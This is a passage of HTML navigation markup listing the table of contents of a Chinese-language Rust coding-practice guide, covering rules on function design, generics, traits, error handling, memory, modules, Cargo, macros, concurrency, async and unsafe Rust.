aria-hidden="true">3.9.</strong> 函数设计</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/fn-design/P.FUD.01.html"><strong aria-hidden="true">3.9.1.</strong> P.FUD.01 传递到闭包的变量建议单独重新绑定</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/fn-design/P.FUD.02.html"><strong aria-hidden="true">3.9.2.</strong> P.FUD.02 函数返回值不要使用 return</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/fn-design/G.FUD.01.html"><strong aria-hidden="true">3.9.3.</strong> G.FUD.01 函数参数最长不要超过五个</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/fn-design/G.FUD.02.html"><strong aria-hidden="true">3.9.4.</strong> G.FUD.02 当函数参数实现了 Copy，并且是按值传入，如果值可能会太大，则宜考虑按引用传递</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/fn-design/G.FUD.03.html"><strong aria-hidden="true">3.9.5.</strong> G.FUD.03 当函数参数出现太多 bool 类型的参数时，应该考虑将其封装为自定义的结构体或枚举</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/fn-design/G.FUD.04.html"><strong aria-hidden="true">3.9.6.</strong> G.FUD.04 当Copy 类型的足够小的值作为函数参数时，应该按值（by-value）传入，而不是引用(by-ref)</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/fn-design/G.FUD.05.html"><strong aria-hidden="true">3.9.7.</strong> G.FUD.05 不要总是为函数指定 inline(always)</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/fn-design/G.FUD.06.html"><strong aria-hidden="true">3.9.8.</strong> G.FUD.06 函数参数应该考虑兼容多种类型</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/generic.html"><strong aria-hidden="true">3.10.</strong> 泛型</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/generic/P.GEN.01.html"><strong aria-hidden="true">3.10.1.</strong> P.GEN.01 用泛型来抽象公共语义</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/generic/P.GEN.02.html"><strong aria-hidden="true">3.10.2.</strong> P.GEN.02 不要随便使用 impl Trait 语法替代泛型限定</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/generic/P.GEN.03.html"><strong aria-hidden="true">3.10.3.</strong> P.GEN.03 不要使用太多泛型参数和 trait 限定，否则会增长编译时间</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/generic/P.GEN.04.html"><strong aria-hidden="true">3.10.4.</strong> P.GEN.04 为泛型类型实现方法时，impl 中声明的泛型类型参数一定要被用到</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/generic/P.GEN.05.html"><strong aria-hidden="true">3.10.5.</strong> P.GEN.05 定义泛型函数时，如果该函数实现用到来自 trait 定义的相关行为，需要为泛型指定相关 trait 的限定</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/generic/G.GEN.01.html"><strong aria-hidden="true">3.10.6.</strong> G.GEN.01 不要在泛型位置上使用内建类型</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/generic/G.GEN.02.html"><strong aria-hidden="true">3.10.7.</strong> G.GEN.02 使用 Rust 标准库中某些方法，要注意避免使用其泛型默认实现，而应该使用具体类型的实现</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/traits.html"><strong aria-hidden="true">3.11.</strong> 特质</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/traits/P.TRA.01.html"><strong aria-hidden="true">3.11.1.</strong> P.TRA.01 使用 trait 时要注意 trait 一致性规则</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/traits/std-builtin.html"><strong aria-hidden="true">3.11.2.</strong> 标准库内置 trait</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/traits/std-builtin/P.TRA.BLN.01.html"><strong aria-hidden="true">3.11.2.1.</strong> P.TRA.BLN.01 在实现Borrow特质时，需要注意一致性</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/traits/std-builtin/G.TRA.BLN.01.html"><strong aria-hidden="true">3.11.2.2.</strong> G.TRA.BLN.01 应该具体类型的 default() 方法代替 Default::default() 调用</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/traits/std-builtin/G.TRA.BLN.02.html"><strong aria-hidden="true">3.11.2.3.</strong> G.TRA.BLN.02 不要为迭代器实现Copy 特质</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/traits/std-builtin/G.TRA.BLN.03.html"><strong aria-hidden="true">3.11.2.4.</strong> G.TRA.BLN.03 能使用派生宏（Derive）自动实现Default特质就不要用手工实现</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/traits/std-builtin/G.TRA.BLN.04.html"><strong aria-hidden="true">3.11.2.5.</strong> G.TRA.BLN.04 在使用#[derive(Hash)] 的时候，避免再手工实现 PartialEq</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/traits/std-builtin/G.TRA.BLN.05.html"><strong aria-hidden="true">3.11.2.6.</strong> G.TRA.BLN.05 在使用#[derive(Ord)] 的时候，避免再手工实现 PartialOrd</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/traits/std-builtin/G.TRA.BLN.06.html"><strong aria-hidden="true">3.11.2.7.</strong> G.TRA.BLN.06 不要对实现 Copy 或引用类型调用 std::mem::drop 和 std::mem::forgot</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/traits/std-builtin/G.TRA.BLN.07.html"><strong aria-hidden="true">3.11.2.8.</strong> G.TRA.BLN.07 对实现 Copy 的可迭代类型来说，要通过迭代器拷贝其所有元素时，应该使用 copied方法，而非cloned</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/traits/std-builtin/G.TRA.BLN.08.html"><strong aria-hidden="true">3.11.2.9.</strong> G.TRA.BLN.08 实现 From 而不是 Into</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/traits/std-builtin/G.TRA.BLN.09.html"><strong aria-hidden="true">3.11.2.10.</strong> G.TRA.BLN.09 一般情况下不要给 Copy 类型手工实现 Clone</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/traits/std-builtin/G.TRA.BLN.10.html"><strong aria-hidden="true">3.11.2.11.</strong> G.TRA.BLN.10 不要随便使用Deref特质来模拟继承</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/traits/trait-object.html"><strong aria-hidden="true">3.11.3.</strong> trait 对象</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/traits/trait-object/P.TRA.OBJ.01.html"><strong aria-hidden="true">3.11.3.1.</strong> P.TRA.OBJ.01 根据场景合理选择使用trait对象或泛型静态分发</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/traits/trait-object/P.TRA.OBJ.02.html"><strong aria-hidden="true">3.11.3.2.</strong> P.TRA.OBJ.02 除非必要，避免自定义虚表</a></li></ol></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/error-handle.html"><strong aria-hidden="true">3.12.</strong> 错误处理</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/error-handle/P.ERR.01.html"><strong aria-hidden="true">3.12.1.</strong> P.ERR.01 当传入函数的参数值因为超出某种限制可能会导致函数调用失败，应该使用断言</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/error-handle/P.ERR.02.html"><strong aria-hidden="true">3.12.2.</strong> P.ERR.02 在确定 Option 和 Result&lt;T, E&gt;类型的值不可能是 None 或 Err 时，请用 expect 代替 unwrap()</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/error-handle/G.ERR.01.html"><strong aria-hidden="true">3.12.3.</strong> G.ERR.01 在处理 Option 和 Result&lt;T, E&gt; 类型时，不要随便使用 unwrap</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/error-handle/G.ERR.02.html"><strong aria-hidden="true">3.12.4.</strong> G.ERR.02 不要滥用 expect，请考虑用 unwrap_or_ 系列方法代替</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/memory.html"><strong aria-hidden="true">3.13.</strong> 内存管理</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/memory/lifetime.html"><strong aria-hidden="true">3.13.1.</strong> 生命周期</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/memory/lifetime/P.MEM.LFT.01.html"><strong aria-hidden="true">3.13.1.1.</strong> P.MEM.LFT.01 生命周期参数命名尽量有意义且简洁</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/memory/lifetime/P.MEM.LFT.02.html"><strong aria-hidden="true">3.13.1.2.</strong> P.MEM.LFT.02 通常需要显式地标注生命周期，而非利用编译器推断</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/memory/smart-ptr.html"><strong aria-hidden="true">3.13.2.</strong> 智能指针</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/memory/smart-ptr/P.MEM.SPT.01.html"><strong aria-hidden="true">3.13.2.1.</strong> P.MEM.SPT.01 使用 RefCell&lt;T&gt; 时宜使用 try_borrow/try_borrow_mut 方法</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/memory/box.html"><strong aria-hidden="true">3.13.3.</strong> Box 类型</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/memory/box/G.MEM.BOX.01.html"><strong aria-hidden="true">3.13.3.1.</strong> G.MEM.BOX.01 一般情况下，不应直接对 Box&lt;T&gt; 进行借用</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/memory/box/G.MEM.BOX.02.html"><strong aria-hidden="true">3.13.3.2.</strong> G.MEM.BOX.02 一般情况下，不应直接对已经在堆上分配内存的类型进行 Box 装箱</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/memory/box/G.MEM.BOX.03.html"><strong aria-hidden="true">3.13.3.3.</strong> G.MEM.BOX.03 一般情况下，不应直接对栈分配类型进行 Box 装箱</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/memory/drop.html"><strong aria-hidden="true">3.13.4.</strong> Drop 析构</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/memory/drop/G.MEM.DRP.01.html"><strong aria-hidden="true">3.13.4.1.</strong> G.MEM.DRP.01 要注意防范内存泄漏</a></li></ol></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/module.html"><strong aria-hidden="true">3.14.</strong> 模块</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/module/P.MOD.01.html"><strong aria-hidden="true">3.14.1.</strong> P.MOD.01 合理控制对外接口和模块之间的可见性</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/module/P.MOD.02.html"><strong aria-hidden="true">3.14.2.</strong> P.MOD.02 将模块的测试移动到单独的文件，有助于增加编译速度</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/module/G.MOD.01.html"><strong aria-hidden="true">3.14.3.</strong> G.MOD.01 使用导入模块中的类型或函数，在某些情况下需要带模块名前缀</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/module/G.MOD.02.html"><strong aria-hidden="true">3.14.4.</strong> G.MOD.02 如果是作为库供别人使用，在 lib.rs中重新导出对外类型、函数和 trait 等</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/module/G.MOD.03.html"><strong aria-hidden="true">3.14.5.</strong> G.MOD.03 导入模块不要随便使用 通配符*</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/module/G.MOD.04.html"><strong aria-hidden="true">3.14.6.</strong> G.MOD.04 一个项目中应该避免使用不同的模块布局风格</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/module/G.MOD.05.html"><strong aria-hidden="true">3.14.7.</strong> G.MOD.05 不要在私有模块中设置其内部类型或函数方法为 pub(crate)</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/cargo.html"><strong aria-hidden="true">3.15.</strong> 包管理</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/cargo/P.CAR.01.html"><strong aria-hidden="true">3.15.1.</strong> P.CAR.01 应该尽量把项目划分为合理的 crate 组合</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/cargo/P.CAR.02.html"><strong aria-hidden="true">3.15.2.</strong> P.CAR.02 不要滥用 Features</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/cargo/P.CAR.03.html"><strong aria-hidden="true">3.15.3.</strong> P.CAR.03 使用 cargo features 来代替 --cfg 条件编译参数</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/cargo/P.CAR.04.html"><strong aria-hidden="true">3.15.4.</strong> P.CAR.04 宜使用 cfg! 来代替 #[cfg]</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/cargo/G.CAR.01.html"><strong aria-hidden="true">3.15.5.</strong> G.CAR.01 当项目是可执行程序而非库时，建议使用 src/main.rs 和 src/lib.rs 模式</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/cargo/G.CAR.02.html"><strong aria-hidden="true">3.15.6.</strong> G.CAR.02 Crate 的 Cargo.toml 中应该包含必要的元信息</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/cargo/G.CAR.03.html"><strong aria-hidden="true">3.15.7.</strong> G.CAR.03 Feature 命名应该避免否定式或多余的前后缀</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/cargo/G.CAR.04.html"><strong aria-hidden="true">3.15.8.</strong> G.CAR.04 Cargo.toml 中依赖包版本不应使用通配符</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros.html"><strong aria-hidden="true">3.16.</strong> 宏</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/macros/P.MAC.01.html"><strong aria-hidden="true">3.16.1.</strong> P.MAC.01 不要轻易使用宏</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros/P.MAC.02.html"><strong aria-hidden="true">3.16.2.</strong> P.MAC.02 实现宏语法的时候，应该尽量贴近 Rust 语法</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros/G.MAC.01.html"><strong aria-hidden="true">3.16.3.</strong> G.MAC.01 dbg!() 宏只应该用于调试代码</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros/G.MAC.02.html"><strong aria-hidden="true">3.16.4.</strong> G.MAC.02 使用宏时应该考虑宏展开会让编译文件膨胀的影响</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros/decl.html"><strong aria-hidden="true">3.16.5.</strong> 声明宏</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/macros/decl/P.MAC.DCL.01.html"><strong aria-hidden="true">3.16.5.1.</strong> P.MAC.DCL.01 不要将声明宏内的变量作为外部变量使用</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros/decl/P.MAC.DCL.02.html"><strong aria-hidden="true">3.16.5.2.</strong> P.MAC.DCL.02 在编写多个宏规则时，应该先从匹配粒度最小的开始写</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros/decl/P.MAC.DCL.03.html"><strong aria-hidden="true">3.16.5.3.</strong> P.MAC.DCL.03 不要在片段分类符跟随它不匹配的符号</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros/decl/P.MAC.DCL.04.html"><strong aria-hidden="true">3.16.5.4.</strong> P.MAC.DCL.04 匹配规则要精准，不要模糊不清</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros/decl/P.MAC.DCL.05.html"><strong aria-hidden="true">3.16.5.5.</strong> P.MAC.DCL.05 使用宏替换（substitution）元变量的时候要注意选择合适的片段分类符</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros/decl/P.MAC.DCL.06.html"><strong aria-hidden="true">3.16.5.6.</strong> P.MAC.DCL.06 当宏需要接收 self 时需要注意</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros/decl/P.MAC.DCL.07.html"><strong aria-hidden="true">3.16.5.7.</strong> P.MAC.DCL.07 确保在宏定义之后再去调用宏</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros/decl/P.MAC.DCL.08.html"><strong aria-hidden="true">3.16.5.8.</strong> P.MAC.DCL.08 同一个 crate 内定义的宏相互调用时，需要注意卫生性</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros/proc.html"><strong aria-hidden="true">3.16.6.</strong> 过程宏</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/macros/proc/P.MAC.PRO.01.html"><strong aria-hidden="true">3.16.6.1.</strong> P.MAC.PRO.01 不要使用过程宏来规避静态分析检查</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros/proc/P.MAC.PRO.02.html"><strong aria-hidden="true">3.16.6.2.</strong> P.MAC.PRO.02 实现过程宏时要对关键特性增加测试</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros/proc/P.MAC.PRO.03.html"><strong aria-hidden="true">3.16.6.3.</strong> P.MAC.PRO.03 保证过程宏的卫生性</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/macros/proc/P.MAC.PRO.04.html"><strong aria-hidden="true">3.16.6.4.</strong> P.MAC.PRO.04 给出正确的错误位置</a></li></ol></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/code-generation.html"><strong aria-hidden="true">3.17.</strong> 代码生成</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/code-generation/P.CGN.01.html"><strong aria-hidden="true">3.17.1.</strong> P.CGN.01 代码生成要按情况选择使用过程宏还是 build.rs</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/code-generation/P.CGN.02.html"><strong aria-hidden="true">3.17.2.</strong> P.CGN.02 build.rs 生成的代码要保证没有任何警告</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/threads.html"><strong aria-hidden="true">3.18.</strong> 多线程</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/threads/lock.html"><strong aria-hidden="true">3.18.1.</strong> 锁同步</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/threads/lock/P.MTH.LCK.01.html"><strong aria-hidden="true">3.18.1.1.</strong> P.MTH.LCK.01 多线程下要注意识别锁争用的情况，避免死锁</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/threads/lock/G.MTH.LCK.01.html"><strong aria-hidden="true">3.18.1.2.</strong> G.MTH.LCK.01 对布尔或引用并发访问应该使用原子类型而非互斥锁</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/threads/lock/G.MTH.LCK.02.html"><strong aria-hidden="true">3.18.1.3.</strong> G.MTH.LCK.02 宜使用 Arc / Arc&lt;[T]&gt; 来代替 Arc / Arc&lt;Vec&gt;</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/threads/lock/G.MTH.LCK.03.html"><strong aria-hidden="true">3.18.1.4.</strong> G.MTH.LCK.03 尽量避免直接使用标准库 std::sync 模块中的同步原语，替换为 parking_lot</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/threads/lock/G.MTH.LCK.04.html"><strong aria-hidden="true">3.18.1.5.</strong> G.MTH.LCK.04 尽量避免直接使用标准库 std::sync::mpsc 模块中的 channel，替换为 crossbeam</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/threads/lock-free.html"><strong aria-hidden="true">3.18.2.</strong> 无锁</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/threads/lock-free/P.MTH.LKF.01.html"><strong aria-hidden="true">3.18.2.1.</strong> P.MTH.LKF.01 除非必要，否则建议使用同步锁</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/threads/lock-free/P.MTH.LKF.02.html"><strong aria-hidden="true">3.18.2.2.</strong> P.MTH.LKF.02 使用无锁编程时，需要合理选择内存顺序</a></li></ol></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/async-await.html"><strong aria-hidden="true">3.19.</strong> 异步编程</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/async-await/P.ASY.01.html"><strong aria-hidden="true">3.19.1.</strong> P.ASY.01 异步编程并不适合所有场景，计算密集型场景应该考虑同步编程</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/async-await/G.ASY.01.html"><strong aria-hidden="true">3.19.2.</strong> G.ASY.01 在 async 块或函数中调用 async 函数或闭包请不要忘记添加.await</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/async-await/G.ASY.02.html"><strong aria-hidden="true">3.19.3.</strong> G.ASY.02 在跨 await 调用中，需要对其持有的同步互斥锁进行处理</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/async-await/G.ASY.03.html"><strong aria-hidden="true">3.19.4.</strong> G.ASY.03 在跨 await 调用中，需要对其持有 RefCell 的引用进行处理</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/async-await/G.ASY.04.html"><strong aria-hidden="true">3.19.5.</strong> G.ASY.04 避免定义不必要的异步函数</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/async-await/G.ASY.05.html"><strong aria-hidden="true">3.19.6.</strong> G.ASY.05 避免在异步处理过程中包含阻塞操作</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust.html"><strong aria-hidden="true">3.20.</strong> Unsafe Rust</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/P.UNS.01.html"><strong aria-hidden="true">3.20.1.</strong> P.UNS.01 不要为了逃避编译器安全检查而滥用 Unsafe Rust</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/P.UNS.02.html"><strong aria-hidden="true">3.20.2.</strong> P.UNS.02 不要为了提升性能而盲目使用 Unsafe Rust</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/G.UNS.01.html"><strong aria-hidden="true">3.20.3.</strong> G.UNS.01 不宜为带有 unsafe 命名的类型或方法创建别名</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/safe_abstract.html"><strong aria-hidden="true">3.20.4.</strong> 安全抽象</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/safe_abstract/P.UNS.SAS.01.html"><strong aria-hidden="true">3.20.4.1.</strong> P.UNS.SAS.01 代码中要注意是否会因为 Panic 发生而导致内存安全问题</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/safe_abstract/P.UNS.SAS.02.html"><strong aria-hidden="true">3.20.4.2.</strong> P.UNS.SAS.02 Unsafe 代码编写者有义务检查代码是否满足安全不变式</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/safe_abstract/P.UNS.SAS.03.html"><strong aria-hidden="true">3.20.4.3.</strong> P.UNS.SAS.03 不要随便在公开的 API 中暴露未初始化内存</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/safe_abstract/P.UNS.SAS.04.html"><strong aria-hidden="true">3.20.4.4.</strong> P.UNS.SAS.04 避免因为 Panic Safety 而导致双重释放</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/safe_abstract/P.UNS.SAS.05.html"><strong aria-hidden="true">3.20.4.5.</strong> P.UNS.SAS.05 手动实现 auto trait 时要充分考虑其安全性</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/safe_abstract/P.UNS.SAS.06.html"><strong aria-hidden="true">3.20.4.6.</strong> P.UNS.SAS.06 不要随便在公开的 API 中暴露裸指针</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/safe_abstract/P.UNS.SAS.07.html"><strong aria-hidden="true">3.20.4.7.</strong> P.UNS.SAS.07 在抽象安全方法的同时，也建议为性能考虑而增加相应的 Unsafe 方法</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/safe_abstract/P.UNS.SAS.08.html"><strong aria-hidden="true">3.20.4.8.</strong> P.UNS.SAS.08 函数参数是不可变借用的时候，返回值不应该是可变借用</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/safe_abstract/P.UNS.SAS.09.html"><strong aria-hidden="true">3.20.4.9.</strong> P.UNS.SAS.09 在任何 Unsafe 块之前都应该加 SAFETY 注释</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/safe_abstract/G.UNS.SAS.01.html"><strong aria-hidden="true">3.20.4.10.</strong> G.UNS.SAS.01 在公开的 unsafe 函数的文档中必须增加 Safety 注释</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/safe_abstract/G.UNS.SAS.02.html"><strong aria-hidden="true">3.20.4.11.</strong> G.UNS.SAS.02 在 Unafe 函数中应使用 assert! 而非 debug_assert! 去校验边界条件</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/raw_ptr.html"><strong aria-hidden="true">3.20.5.</strong> 裸指针操作</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/raw_ptr/P.UNS.PTR.01.html"><strong aria-hidden="true">3.20.5.1.</strong> P.UNS.PTR.01 不要将裸指针在多线程间共享</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/raw_ptr/P.UNS.PTR.02.html"><strong aria-hidden="true">3.20.5.2.</strong> P.UNS.PTR.02 建议使用 NonNull&lt;T&gt; 来替代 *mut T</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/raw_ptr/P.UNS.PTR.03.html"><strong aria-hidden="true">3.20.5.3.</strong> P.UNS.PTR.03 使用指针类型构造泛型结构体时，需要使用 PhantomData&lt;T&gt; 来指定 T上的协变和所有权</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/raw_ptr/G.UNS.PTR.01.html"><strong aria-hidden="true">3.20.5.4.</strong> G.UNS.PTR.01 当指针类型被强转为和当前内存对齐不一致的指针类型时，禁止对其解引用</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/raw_ptr/G.UNS.PTR.02.html"><strong aria-hidden="true">3.20.5.5.</strong> G.UNS.PTR.02 禁止将不可变指针手工转换为可变指针</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/raw_ptr/G.UNS.PTR.03.html"><strong aria-hidden="true">3.20.5.6.</strong> G.UNS.PTR.03 尽量使用 pointer::cast 来代替 使用 as 强转指针</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/union.html"><strong aria-hidden="true">3.20.6.</strong> 联合体</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/union/P.UNS.UNI.01.html"><strong aria-hidden="true">3.20.6.1.</strong> P.UNS.UNI.01 除了与 C 交互，尽量不要使用 Union</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/union/P.UNS.UNI.02.html"><strong aria-hidden="true">3.20.6.2.</strong> P.UNS.UNI.02 不要把联合体的不同变体用在不同生命周期内</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/mem.html"><strong aria-hidden="true">3.20.7.</strong> 内存</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/mem/P.UNS.MEM.01.html"><strong aria-hidden="true">3.20.7.1.</strong> P.UNS.MEM.01 要注意选择合适的结构体、元组、枚举的数据布局</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/mem/P.UNS.MEM.02.html"><strong aria-hidden="true">3.20.7.2.</strong> P.UNS.MEM.02 不能修改其它进程或动态库的内存变量</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/mem/P.UNS.MEM.03.html"><strong aria-hidden="true">3.20.7.3.</strong> P.UNS.MEM.03 不能让 String/Vec 自动 Drop 其它进程或动态库的内存数据</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/mem/P.UNS.MEM.04.html"><strong aria-hidden="true">3.20.7.4.</strong> P.UNS.MEM.04 尽量用可重入(reentrant)版本的 C-API 或系统调用</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/mem/P.UNS.MEM.05.html"><strong aria-hidden="true">3.20.7.5.</strong> P.UNS.MEM.05 如果需要使用位域，推荐使用第三方库</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/mem/G.UNS.MEM.01.html"><strong aria-hidden="true">3.20.7.6.</strong> G.UNS.MEM.01 使用 MaybeUninit&lt;T&gt; 来处理未初始化的内存</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi.html"><strong aria-hidden="true">3.20.8.</strong> FFi</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.01.html"><strong aria-hidden="true">3.20.8.1.</strong> P.UNS.FFI.01 避免从公开的 Rust API 直接传字符串到 C 中</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.02.html"><strong 